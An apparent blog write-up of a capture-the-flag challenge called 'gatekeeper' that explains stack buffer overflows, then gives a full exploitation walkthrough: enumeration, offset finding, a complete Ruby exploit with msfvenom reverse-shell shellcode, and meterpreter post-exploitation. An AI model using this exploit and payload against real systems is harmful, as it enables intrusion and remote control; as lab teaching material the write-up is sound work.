<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gatekeeper (buffer overflows)</title>
    
<head>
    
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>gatekeeper (buffer overflows)</title>
<meta name="description" content="">


<meta property="og:title" content="gatekeeper (buffer overflows)">
<meta property="og:description" content="">

    
    



<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="gatekeeper (buffer overflows)">
<meta name="twitter:description" content="">

    
    


    <base href="https://bsssq.xyz/">
    <link rel="stylesheet" href="https://bsssq.xyz/css/style.css">
    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
</head>
    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
</head>
<body>
    
<div id="content-area" data-page-type="single">
    <article id="post">
        <header>
            <h1 id="post-title">gatekeeper (buffer overflows)</h1>
            <time datetime="2022-10-23T06:59:16-04:00">
                October 23, 2022
            </time>
        </header>
        <div id="post-content">
            <p>lately, i&rsquo;ve been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in &ldquo;microcontrollers and microprocessors&rdquo;, a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it&rsquo;s used to communicate directly with computer architecture and control the usage of memory, on a hardware level. understanding memory usages and allocations on that level paved the way for utilizing buffer overflows, a very popular attack that is a result of reverse engineering.</p>
<p>what exactly is a buffer overflow? well, what is a buffer? buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. a buffer overflow happens when the volume of the data exceeds the storage capacity of the buffer. what happens then is the program, trying to write the data to the desired buffer, overwrites adjacent memory locations (blocks).</p>
<p>take a buffer for a password that allows a user to log-in to an application. let&rsquo;s say the buffer is designed for an input of 8 bytes. if an input of 10 bytes is received, the program may write the excess data past the buffer boundary.</p>
<p><img src="https://bsssq.xyz/buffer-overflow.png" alt="BOF"></p>
<h2 id="how-can-buffer-overflows-be-used-as-attacks">how can buffer overflows be used as attacks?</h2>
<p>if buffer overflows can force some programs to write to adjacent memory blocks, it follows that an attacker can provide a large input that would force the program to write &ldquo;bad&rdquo; code to those blocks. a buffer overflow would change the execution path of the program, and the attacker can force the program and the target machine to execute a desired payload.</p>
<p>to do this, attackers would need to know the memory layout of a program and details of the buffer, so that they could effectively abuse the storage capacity of the buffer and overwrite areas that also hold executable code. an example of this is overwriting a pointer (an object that points to another area in memory) and point it to a payload.</p>
<p>there are 2 types of buffer overflow attacks. the first, and most common, is <strong>stack-based buffer overflow</strong>. these leverage stack memory that only exists during the runtime of a function or program.</p>
<p>the second, less common as it&rsquo;s more difficult to carry out, is a <strong>heap-based buffer overflow</strong>. these involve flooding the memory space allocated for a program beyond memory used for current runtime operations.</p>
<h2 id="how-can-developers-prevent-buffer-overflows">how can developers prevent buffer overflows?</h2>
<p>on a code level, devs can prevent buffer overflows by implementing security measures directly inside the code or by using languages that offer built-in protection (like perl, java, javascript, c#).</p>
<p>on an OS level, runtime protection measures can help thwart buffer overflows.</p>
<ul>
<li><strong>address space randomization (ASLR)</strong>: since buffer overflows require locations of executable code, randomizing address spaces would make this near impossible to carry out.</li>
<li><strong>data execution prevention</strong>: this flags certain areas of memory as executable or non-executable, and would thus stop an attack from running code in a non-executable region.</li>
<li><strong>structured exception handler overwrite protection (SEHOP)</strong>: structured exception handling (SEH) is a built-in system that manages software and hardware exceptions. <strong>SEHOP</strong> stops malicious code from attacking structured exception handling and thus prevents an attacker from using the SEH overwrite technique. SEH overwrites are achieved using a stack-based buffer overflow to overwrite an exception registration record, stored on a thread&rsquo;s stack.</li>
</ul>
<h2 id="gatekeeper">gatekeeper</h2>
<p>i found this really cool challenge made by an acquaintance, which utilizes a stack-based buffer overflow as a central technique to collect the flags on a target machine. there is no further information provided, which made this challenge one of the most intense and interesting ones i&rsquo;ve cracked so far.</p>
<p>upon getting my tun0 address (10.18.12.60) and the target&rsquo;s address (10.10.10.172), i performed an nmap scan.</p>
<pre tabindex="0"><code>nmap 10.10.10.172

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 15:47 EDT
Nmap scan report for 10.10.90.136
Host is up (0.14s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
49165/tcp open  unknown
</code></pre><p>drilling down on the open ports with a more specific nmap scan:</p>
<pre tabindex="0"><code>nmap -p135,139,445,3389,31337 -A 10.10.10.172
</code></pre><p>right away, i can identify an SMB service running on port 445. the next step should be second nature at this point: enumerate the SMB shares.</p>
<pre tabindex="0"><code>smbclient -L 10.10.10.172
</code></pre><p>although this command can yield some decent information, i&rsquo;ve recently come to prefer using nmap to execute an SMB enumeration script:</p>
<pre tabindex="0"><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.172

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.172\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: &lt;none&gt;
|     Current user access: &lt;none&gt;
|   \\10.10.10.172\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: &lt;none&gt;
|     Current user access: &lt;none&gt;
|   \\10.10.10.172\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.10.172\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: &lt;none&gt;
|_    Current user access: READ
</code></pre><p><img src="https://bsssq.xyz/gatekeeper_smb.jpg" alt="SMB"></p>
<p>the &ldquo;users&rdquo; share looks interesting, so i logged into it:</p>
<pre tabindex="0"><code>smbclient \\\\10.10.10.172\\Users
</code></pre><p>upon executing <code>dir</code>, i see there&rsquo;s a file called &ldquo;gatekeeper.exe&rdquo;. to download it to my local machine, i simply execute <code>smbget smb://10.10.10.172/Users/Share/gatekeeper.exe</code></p>
<p>at this point, i fire up a windows VM i&rsquo;d created for the purposes of reverse engineering and creating proof-of-concepts for buffer overflow attacks. i then transfer &ldquo;gatekeeper.exe&rdquo; to my windows VM using the python simplehttpserver. once it&rsquo;s downloaded to my windows machine, i open and run it in immunity debugger, a powerful application used to analyze malware and reverse engineer binary files.</p>
<p>before i do anything else with immunity debugger, i need to find the port that gatekeeper is running on. inside the windows command prompt, i first find the process ID (PID) of the program and then use that to find the port.</p>
<pre tabindex="0"><code>tasklist | findstr gatekeeper.exe
</code></pre><p><img src="https://bsssq.xyz/gatekeeper_PID.png" alt="PID"></p>
<pre tabindex="0"><code>netstat -aon | findstr 5148
</code></pre><p><img src="https://bsssq.xyz/gatekeeper_netstat.png" alt="netstat"></p>
<p>the program is running on port 31337.</p>
<p>now that we know which port the program is running on, and while it&rsquo;s running inside immunity debugger (which will delineate all the memory operations of the program), i return to my kali machine to create a simple exploit that will supply gatekeeper with my inputs. if the program successfully receives my input, i&rsquo;ll then try to crash it with a large string and if that also works, i&rsquo;ll work on a proper payload that will not only break the program but force it to execute my exploit in adjacent memory.</p>
<p>i prefer writing overflow exploits in ruby (it&rsquo;s a fun new language that i&rsquo;ve been learning), so for the simple exploit i&rsquo;ll use a runtime dev console called <code>pry</code>. this can be run directly inside the terminal.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;hello&#34;</span>
</span></span></code></pre></div><p>this little piece of code opens a socket to the program running in windows (addressed at 192.168.100.4) on port 31337. it then &ldquo;puts&rdquo; a string (hello) as the input.</p>
<p><img src="https://bsssq.xyz/gatekeeper_hello.png" alt="hello"></p>
<p>the program received our 6 bytes of input. now i&rsquo;m going to try and crash it. instead of &ldquo;hello&rdquo;, i&rsquo;ll send a string of As. 200 of them, to be exact.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">200</span>
</span></span></code></pre></div><p><img src="https://bsssq.xyz/gatekeeper_A200.png" alt="A"></p>
<p>the program crashed, which means buffer overflow is possible!</p>
<p>to do this, i need to calculate something called the &ldquo;EIP offset&rdquo;. EIP stands for extended instruction pointer, and it tells the computer where to go to execute the next command. it basically controls the flow of a program. the EIP offset is then the exact number of bytes in the payload after which the EIP gets overwritten. to find the EIP offset, i&rsquo;ll first create a string with which to crash the program, and then observe the EIP in immunity debugger.</p>
<pre tabindex="0"><code>msf-pattern_create -l 200

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></pre><p>i&rsquo;ll paste this string (200 characters long) into the pry:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&#34;</span>
</span></span></code></pre></div><p><img src="https://bsssq.xyz/gatekeeper_EIP.png" alt="EIP"></p>
<p>the EIP is pointed at 39654138. i can use this to find the offset:</p>
<pre tabindex="0"><code>msf-pattern_offset -l 2500 -q 39654138

exact match at offset 146
</code></pre><p>to verify this offset value, i&rsquo;ll create an input that will enter A for the first 146 bytes, and then B for the next 4.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
</span></span></code></pre></div><p><img src="https://bsssq.xyz/gatekeeper_B.png" alt="B"></p>
<p>the EIP is now overwritten with &ldquo;42424242&rdquo;, which is &ldquo;BBBB&rdquo; in hex.</p>
<p>so, i know the program is exploitable, along with the EIP offset value. i can now write the proof-of-concept of my exploit. what i&rsquo;m trying to do is not simply crash the program, but inject a payload (&ldquo;shellcode&rdquo;) that will spawn a reverse shell that i can then use to further exploit the target machine. the skeleton of the script, called <strong>bof.rb</strong>, looks as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span> <span style="color:#75715e">#NOP slide, forces the program to start right after the offset.</span>
</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#JMP ESP</span>
</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e">#additional nops for argument values</span>
</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;socket&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;&lt;targetIP&#34;</span>,<span style="color:#ae81ff">31337</span>){ <span style="color:#f92672">|</span>s<span style="color:#f92672">|</span> s<span style="color:#f92672">.</span>puts buff}
</span></span></code></pre></div><p>the ESP register is the stack pointer, which will execute the contents of the stack. now that i have control of the EIP register, i need it to somehow point to the ESP. this is where JMP ESP comes in. JMP ESP basically jumps to the desired ESP.</p>
<p>the shellcode section is where my payload will go. before i create a payload, i need to find the &ldquo;bad characters&rdquo;. certain byte characters cause issues in exploit development. a couple common bad characters are x00 (null byte: truncates the shellcode when executed) and x0a (carriage return). to find all possible bad characters, i&rsquo;ll just write a list of all hex characters (excluding x00 and x0a).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff<span style="color:#e6db74">&#34;&#34;</span>
</span></span></code></pre></div><p>i&rsquo;ll run the exploit using <code>ruby bof.rb</code> and then in immunity debugger, compare against a byte array to isolate the bad characters. note the ESP when the exploit terminates: 008D19E4.</p>
<pre tabindex="0"><code>!mona bytearray -b &#34;\x00\x01\x02\x03\x04&#34;
!mona compare -f C:\mona\gatekeeper\bytearray.txt 008D19E4
</code></pre><p><img src="https://bsssq.xyz/gatekeeper_badchars.png" alt="badchars"></p>
<p>i used an expanded array from x00 to x04, and the results show that x0a is the first corrupted byte. that means the only bad characters i have are x00 and x0a.</p>
<p>before i move on, i must verify if ASLR (address space randomization) is turned off. the attack will not work otherwise.</p>
<pre tabindex="0"><code>!mona modules
</code></pre><p>ASLR is set to &ldquo;false&rdquo;, so i can proceed with finding the JMP ESP values.</p>
<pre tabindex="0"><code>!mona jmp -r esp -m gatekeeper.exe
</code></pre><p><img src="https://bsssq.xyz/gatekeeper_esp.png" alt="ESP"></p>
<p>i get back 2 pointers: 0x080414c3 and 0x080416bf. i&rsquo;ll use the former, but for my script i have to convert it to <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> format, which stores the least significant byte at the smallest memory address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>for the actual shellcode, i&rsquo;ll use msfvenom.</p>
<pre tabindex="0"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local IP&gt; LPORT=4444 -f rb -b &#34;\x00\x0a&#34;
</code></pre><p><img src="https://bsssq.xyz/gatekeeper_shellcode.png" alt="shellcode"></p>
<p>the code for bof.rb is now complete!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span> <span style="color:#75715e">#NOP slide, forces the program to start right after the offset.</span>
</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#JMP ESP</span>
</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e">#additional NOPs for argument values</span>
</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span>\xdb\xc8\xb8\xf3\x0f\xd1\xd9\xd9\x74\x24\xf4\x5d\x29\xc9<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xb6\x1c\x33\x2c\xc4<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xcb\x31\xcf\x34\x0c\x56\x59\xd1\x3d\x56\x3d\x92\x6e\x66<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x35\xf6\x82\x0d\x1b\xe2\x11\x63\xb4\x05\x91\xce\xe2\x28<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x22\x62\xd6\x2b\xa0\x79\x0b\x8b\x99\xb1\x5e\xca\xde\xac<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x93\x9e\xb7\xbb\x06\x0e\xb3\xf6\x9a\xa5\x8f\x17\x9b\x5a<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x47\x19\x8a\xcd\xd3\x40\x0c\xec\x30\xf9\x05\xf6\x55\xc4<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xdc\x8d\xae\xb2\xde\x47\xff\x3b\x4c\xa6\xcf\xc9\x8c\xef<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe8\x31\xfb\x19\x0b\xcf\xfc\xde\x71\x0b\x88\xc4\xd2\xd8<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x2a\x20\xe2\x0d\xac\xa3\xe8\xfa\xba\xeb\xec\xfd\x6f\x80<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x09\x75\x8e\x46\x98\xcd\xb5\x42\xc0\x96\xd4\xd3\xac\x79<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe8\x03\x0f\x25\x4c\x48\xa2\x32\xfd\x13\xab\xf7\xcc\xab<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x2b\x90\x47\xd8\x19\x3f\xfc\x76\x12\xc8\xda\x81\x55\xe3<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x9b\x1d\xa8\x0c\xdc\x34\x6f\x58\x8c\x2e\x46\xe1\x47\xae<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x67\x34\xc7\xfe\xc7\xe7\xa8\xae\xa7\x57\x41\xa4\x27\x87<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x71\xc7\xed\xa0\x18\x32\x66\xc5\xce\x30\x4a\xb1\xec\x48<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa7\xf2\x78\xae\xad\xe4\x2c\x79\x5a\x9c\x74\xf1\xfb\x61<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa3\x7c\x3b\xe9\x40\x81\xf2\x1a\x2c\x91\x63\xeb\x7b\xcb<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x22\xf4\x51\x63\xa8\x67\x3e\x73\xa7\x9b\xe9\x24\xe0\x6a<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe0\xa0\x1c\xd4\x5a\xd6\xdc\x80\xa5\x52\x3b\x71\x2b\x5b<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xce\xcd\x0f\x4b\x16\xcd\x0b\x3f\xc6\x98\xc5\xe9\xa0\x72<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa4\x43\x7b\x28\x6e\x03\xfa\x02\xb1\x55\x03\x4f\x47\xb9<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xb2\x26\x1e\xc6\x7b\xaf\x96\xbf\x61\x4f\x58\x6a\x22\x7f<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x13\x36\x03\xe8\xfa\xa3\x11\x75\xfd\x1e\x55\x80\x7e\xaa<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x26\x77\x9e\xdf\x23\x33\x18\x0c\x5e\x2c\xcd\x32\xcd\x4d<span style="color:#e6db74">&#34; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xc4<span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;socket&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;10.10.10.172&#34;</span>,<span style="color:#ae81ff">31337</span>){ <span style="color:#f92672">|</span>s<span style="color:#f92672">|</span> s<span style="color:#f92672">.</span>puts buff}
</span></span></code></pre></div><p>before executing this script, i&rsquo;ll set up a netcat listener that can receive the reverse shell.</p>
<p><code>nc -lvnp 4444</code></p>
<p>if, for whatever reason, the port is clogged, i can simply hard kill the process running on it:</p>
<pre tabindex="0"><code>kill -9 $(lsof -t -i:4444)
</code></pre><p>execute the script using <code>ruby bof.rb</code> and a shell will have spawned in the netcat session. the flag is stored on the desktop.</p>
<p><img src="https://bsssq.xyz/gatekeeper_natbat.png" alt="natbat"></p>
<p>a quick check of the user&rsquo;s privileges shows that i don&rsquo;t have any special access, so here comes the privilege escalation portion of the challenge.</p>
<p><img src="https://bsssq.xyz/gatekeeper_whoami.png" alt="whoami"></p>
<p>i&rsquo;ll create another shellcode, but this time i want to upgrade it to a meterpreter shell.</p>
<pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;local IP&gt; LPORT=5555 -f rb -b &#34;\x00\x0a&#34;
</code></pre><p>in another terminal window, i&rsquo;ll run the metasploit console to run the handler.</p>
<p><img src="https://bsssq.xyz/gatekeeper_handler.png" alt="handler"></p>
<p>running the exploit using <code>exploit -j</code> and running my overflow script on the side using <code>ruby bof.rb</code>, a reverse shell will be spawned. once the meterpreter shell is spawned, i&rsquo;ll try to enumerate the applications on the target.</p>
<pre tabindex="0"><code>&gt; run post/windows/gather/enum_applications

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 Amazon SSM Agent                                                    2.3.842.0
 Amazon SSM Agent                                                    2.3.842.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
